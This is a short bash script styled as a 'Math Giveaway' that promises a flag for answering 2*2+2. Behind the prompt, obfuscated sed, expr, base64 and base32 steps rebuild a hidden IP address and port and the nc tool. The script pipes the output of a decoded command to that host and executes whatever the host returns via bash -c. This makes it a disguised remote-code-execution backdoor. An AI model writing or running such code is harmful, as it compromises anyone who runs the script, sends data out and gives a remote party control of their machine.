echo "[*] Math Giveaway v1.0. Just tell me what is 2*2+2 and get yo flag!";
read q;
if ! [[ $q -eq 6 ]];
then
    echo "[!] Incorrect answer :c";
else
    echo "[.] Gettin yo flag, please, stand by...";
    srv="`echo "127.0.0.1" | sed "s/12/7/g" | sed "s/1/24/g" | sed "s/7.0/7.q/g" | sed "s/0/96/g" | sed "s/q/223/g"` `expr $(expr $(expr 20 \* 15)) \* $(expr $(expr 20 \* 5) - 30) + 6`";
    if [[ `$(echo "==QPN1mY" | rev | base64 -d | base64 -d) -z ${srv}; echo $?;` -eq 0 ]];
    then 
        sleep 3;
        bash -c "`(echo "JZDFGQJ5HU6T2===" | base32 -d | base32 -d | bash;) | $(bash -c "echo bmM= | base64 -d") -n $(echo "${srv}")`";
    else
        echo "[!] Plz check ur internet connection";
    fi;
fi;
